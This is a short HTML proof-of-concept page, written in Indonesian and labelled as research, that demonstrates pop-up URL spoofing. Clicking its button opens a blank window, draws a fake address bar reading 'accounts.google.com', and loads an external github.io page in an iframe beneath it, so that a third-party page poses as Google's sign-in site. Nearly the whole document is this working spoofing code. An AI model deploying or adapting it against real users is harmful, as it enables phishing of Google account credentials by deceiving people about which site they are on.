<!DOCTYPE html>
<html lang="id">
<body>
    <h3>Riset: Window Pop-up URL Spoofing</h3>
    <button id="testBtn">Uji Spoofing</button>

    <script>
        document.getElementById('testBtn').addEventListener('click', () => {
            // Membuka jendela baru dengan ukuran spesifik
            const win = window.open('about:blank', '_blank', 'width=800,height=600');
            
            // Menulis konten yang meniru tampilan UI di dalam jendela tersebut
            win.document.write('<html><body><div style="background:#eee; padding:10px;">URL: https://accounts.google.com</div><iframe src="https://artha231.github.io/testing-browser/" style="width:100%; height:90%;"></iframe></body></html>');
        });
    </script>
</body>
</html>
